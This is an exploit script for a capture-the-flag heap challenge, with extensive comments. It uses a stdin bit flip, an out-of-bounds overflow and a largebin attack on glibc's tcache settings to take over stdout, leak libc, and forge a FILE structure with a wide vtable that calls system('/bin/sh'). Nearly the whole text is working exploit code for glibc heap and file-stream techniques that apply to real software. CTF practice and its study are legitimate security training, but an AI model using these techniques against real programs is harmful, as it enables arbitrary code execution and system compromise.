#!/usr/bin/env python3
# Date: 2024-12-11 15:00:47
# Link: https://github.com/RoderickChan/pwncli

## Ended up solving after the CTF
## Idea: We have a typical heap setup, are able to free and alloc (no show).
## We are also allowed to set one bit at a position in the stdin structure.
## Buffering is enabled, so heap will contain stdin/out/err output.
##
## We leverage this to set _IO_buf_end to be OOB, then leverage that to do largebin attack on the 
## mp_.tcache_bins in libc. This allows us to grab tcache chunks oob of the tcache, which we then 
## use to grab ptrs we partial overwrote to be stdout. Basically we grab stdout from the tcache.
##
## Resources:
## https://blog.kylebot.net/2022/10/22/angry-FSROP/
## https://github.com/5kuuk/CTF-writeups/tree/main/tfc-2024/mcguava
## 
## This script uses pwncli, https://github.com/RoderickChan/pwncli
## Used bata24's fork of gef, https://github.com/bata24/gef

from pwncli import *

context.binary = './chal'
context.log_level = 'debug'
context.timeout = 5


gift.io = process('./chal', aslr=False)
# gift.io = remote('127.0.0.1', 13337)
gift.elf = ELF('./chal')
gift.libc = ELF('./libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def debug(gdbscript="", stop=False):
    if isinstance(io, process):
        gdb.attach(io, gdbscript=gdbscript)
        if stop:
            pause()

def cmd(i, prompt="> "):
    sla(prompt, i)

def add(idx, sz, data):
    cmd('1')
    cmd(str(idx))
    cmd(str(sz))
    cmd(data)
    #......

def dele(idx):
    cmd('2')
    cmd(str(idx))
    #......

def row(pos, bit):
    cmd('3')
    cmd(str(pos))
    cmd(str(bit))
    #......

## For some reason my libc was mapped before main binary, didnt make much of a diff but thats why ur seeing this weird ass base address.
## This is just a breakpoint on the call to the __doallicate entry.
debug('''
      b * 0x155555302000 + 0x8ae94
      ''', stop=True)
## [0] Will have its size corrupted later by the stdout buffer, which lies above.
add(0, 0x28, b"ASDF")

## [1-1] Content of first big large chunk will have padding and fake sizes at the end, as 
## we plan on corrupting [0] to point into here.
cont = flat([
    ## First, fill with padding data. -0x40 to skip total size of [0] as we start writing bytes 0x40 bytes onward from 
    ## [0] , so no need to write xtra
    ##
    ##     0x40 bytes in total                 0x420-0x40 bytes in total          
    ##┌──────────────────────────────────┐┌──────────────────────────────────┐
    ##│[Header][Data....................]││[Header][Data....................]│
    ##└──────────────────────────────────┘└──────────────────────────────────┘
    ##
    b"C"*(0x420 - 0x40),
    ## Chunk [0] new size, (prev size). Unmasked since it will be free at this point.
    ## So no inuse bit.
    0x420,
    ## Need to actually have a chunk to have this prev_size, and then need to forge the 
    ## next chunk as well just to be sure
    0x21,
    ## Random data to fill the gap, chunk size is 0x20 so usable size is -8.
    b"\xff"*0x18,
    ## Now we can stop faking, this should line up with the next chunk after this
    ## which should be the next fence maybe?
    0x21
])
## [1] Will be used for largebin attack later on, among other things, see [1-1]
add(1, 0x428, cont)
## [~] Fences to stop top consuming em
add(3, 0x10, b"FENCE")
## [2] Same as [1].
add(2, 0x418, b"SL")
add(3, 0x10, b"FENCE")

## Put first lb chunk into unsorted bin
dele(1)

## Next, we wanna trigger the overflow using the bitflip on the _IO_buf_end
row(69, 5)

## Now accessing beyond 0x1000 in the stdin buf will overflow
overflower = flat([
    b"X"*0x1000,
    ## prev_size
    0,
    ## new [0] size, will point to the fake 0x20 chunks, which will in turn point to
    ## the last fence chunk at [3].
    0x420 | 1
])
## [1-2] Should flip over the chunk size now
add(3, 0x1108, overflower)

## Now we have overflowed, we wanna free our fake chunk so we can regain control over the area we overlapped
## at [1-2].
dele(0)

add(0, 0x38, "Z")
## Overwrite the BK to point to mp_.tcache_bins to allow us to bug tf out of the tcache.
## -0x20 cuz it'll add the metadata obv.
add(0, 0x38, b"A"*8 + p16(0x51e8 - 0x20))

## Now that we have tampered unsortedbin BK we need to trigger the attack.
## Free into unsortedbin
dele(2)
## Alloc a chunk too big for it, triggering insertion
add(2, 0x500, b"TST")
## Now using this we have OOB; we can request chunks lying outside the tcache bins, basically any pointer on the heap
## So: next thing is we need to leave some libc ptrs for us to use.
## 
## 1 in 16 this will be a ptr to stdout, since we overwrite the libc bin ptr.
add(2, 0x10, p16(0x65c0))
add(2, 0x10, p16(0x65c0))

## Now try to see if we can get a tcache
## This overwrites all ptrs up until the write base, then overwrites the lsb of write base which makes 
## it less than the end. This is one of the key things we need to trigger activity.
##
## Default ahh flags fake buffering on and other shiet so we printin shit.
stdout1 = flat([
    0xfbad1800,
    0,
    0,
    0,
])
stdout1 += b"\x00"
add(2, 0x2558, stdout1)
leak = u64(r(8))
libc.address = leak - 0x204644
print(f"[!] Leak: {hex(leak)}")
print(f"[!] Libc: {hex(libc.address)}")

## Now that we have leaks we can use the second stdout chunk to get rce innit.
## We will use the _wide_vtable method

fstruct = FileStructure()
fstruct.flags = 0x3b01010101010101
fstruct._IO_read_ptr = b"/bin/sh\x00"
fstruct._lock = libc.address + 0x720
## Point _wide_data (off + 0xe0) to a place we can control the value of the _wide_vtable in the struct, this ends up being the stdout ptr succeeding B*8 below.
fstruct._wide_data = libc.sym["_IO_2_1_stdout_"] + 0x10
## Point our vtable to a legit place, as it is verified. This points into the _IO_wfile_jumps table. We offset enough that the 
## old __xsputn entry (off 0x38) now overlaps with the _IO_wfile_overflow entry in the new wide table. This starts the chain 
## when we try to print anything
fstruct.vtable = libc.address + 0x2022b0
## Have our file struct, at end we write our vtable, pointing it back into stdout and subtracting the offset of the 
## __doallocate entry in the vtable (0x68) (since the call will add 0x68 offset back). Then add 0xe0 to put us 
## at the end of the stdout after _wide_vtable, where we have our system ptr 
pload = bytes(fstruct) + p64(libc.sym["system"]) + b"B"*8 + p64(libc.sym["_IO_2_1_stdout_"] - 0x68 + 0xe0)
add(2, 0x2598, pload)
## So basically, edit _wide_data, point back into stdout at a place we can control _wide_vtable, then point the vtable back into stdout AGAIN, at a 
## place we can control the __doallocate entry.
## Then remember to fulfill requirements: offset vtable in stdout so we call _IO_wfile_overflow. Remember that lock is present and correct 
## flags are set.


ia()
